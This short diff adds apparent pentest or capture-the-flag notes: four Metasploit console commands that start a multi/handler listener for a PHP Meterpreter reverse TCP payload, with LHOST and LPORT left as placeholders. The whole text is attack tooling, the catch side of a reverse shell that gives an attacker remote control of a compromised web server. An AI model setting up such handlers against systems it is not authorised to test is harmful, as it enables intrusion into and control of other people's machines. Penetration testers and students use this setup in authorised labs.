@@ -1,0 +1,7 @@
+
+
+# Create a handler to reverse meterpreter tcp
+msfconsole> use exploit/multi/handler
+msfconsole> set payload php/meterpreter/reverse_tcp
+msfconsole> set LHOST <ip>
+msfconsole> set LPORT <port>
